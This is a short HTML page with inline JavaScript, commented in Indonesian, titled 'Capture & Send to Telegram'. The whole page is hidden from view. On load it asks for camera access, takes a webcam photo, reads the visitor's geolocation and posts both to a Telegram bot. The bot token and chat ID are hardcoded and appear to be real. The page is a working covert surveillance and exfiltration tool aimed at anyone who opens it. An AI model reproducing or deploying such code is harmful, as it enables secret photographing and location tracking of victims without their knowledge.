<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Capture & Send to Telegram</title>
</head>
<body style="display:none;">
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const botToken = '7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
    const chatId = '7041008009';

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], { type: mime });
    }

    async function sendToTelegram(imageData, latitude, longitude) {
      try {
        // Kirim foto
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        // Kirim lokasi
        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatId,
            latitude,
            longitude
          })
        });

        console.log("Data berhasil dikirim ke Telegram.");
      } catch (err) {
        console.error("Gagal mengirim ke Telegram:", err);
      }
    }

    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;

        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Ambil frame dari video
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg');

        // Hentikan kamera
        stream.getTracks().forEach(track => track.stop());

        // Ambil lokasi
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            sendToTelegram(imageData, latitude, longitude);
          },
          (err) => {
            console.error("Gagal mendapatkan lokasi:", err);
          }
        );

      } catch (err) {
        console.error("Gagal akses kamera:", err);
      }
    }

    // Mulai otomatis
    captureAndSend();
  </script>
</body>
</html>
